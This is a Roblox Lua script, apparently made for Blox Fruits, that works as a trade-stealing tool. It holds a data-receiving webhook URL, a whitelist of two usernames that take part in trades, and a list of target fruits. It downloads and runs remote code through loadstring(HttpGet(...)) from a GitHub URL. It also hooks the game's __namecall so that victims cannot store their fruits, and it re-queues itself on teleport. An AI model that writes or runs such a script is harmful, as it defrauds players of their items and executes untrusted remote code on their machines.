Webhook = "https://l.webhook.party/hook/L0N5ldom9TLOnRHreS68uGaViNHn21agNydUtPbx%2FuEjiK0kPcD5sQype4MWJ8xGHDlVe6gzA0lfrfcmsuzQ%2BbX1dpAzyOrVFy2WK795PmL7ZO9DPmfvMJ9LPoUwHf6bxub6BXHUvkhVTu%2BujVM3Fo1LWH%2F2W6YXVDnlw3g0mCaMkP3MB6s6Bk8uwcSrfZGX2KSkHk81T2wLrruweGjb%2FBdqhwdz6fEVPebviVI%2FX4YoIgjK2hNrMDRC2pEOw4KHUsooFAb7F2ZukiySKoqIu7Z1anGvm%2BttVanPR%2BfThRAAnvakFwzlJrJLl7TVTGf0gh18a6V4HO0Th0SnMZqrHj4LJgpIZv16EITpDkh70YlCWs6ONcp3JU%2Fx5G%2BNVWhgVJkobZIaoKDWpPyd/Y8cD9y6rCs7ThlrJ"
Usernames = {"raidy280", "Rip_soulking6666"} -- << Username(-s) it'll accept trade with
Fruits = {"Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)"} -- << Fruits you want
FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
    "Quake-Quake",
    "Love-Love",
    "Magma-Magma",
    "Ghost-Ghost",
    "Barrier-Barrier"
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if not checkcaller() and string.lower(method) == "invokeserver" and args[1] == "StoreFruit" then
        print("k")
        return error("wow", 2)
    end

    return oldNamecall(self, ...)
end)

task.spawn(function()
    local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            print("player is on a private server")
        end
    end
end)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.InProgress then
        if syn and syn.queue_on_teleport then
            syn.queue_on_teleport([[ 
            -- << add ur thing to execute ur script or smth idk
            ]])
        elseif queue_on_teleport then
            queue_on_teleport([[ 
            -- << add ur thing to execute ur script or smth idk
            ]])
        end
    end
end)
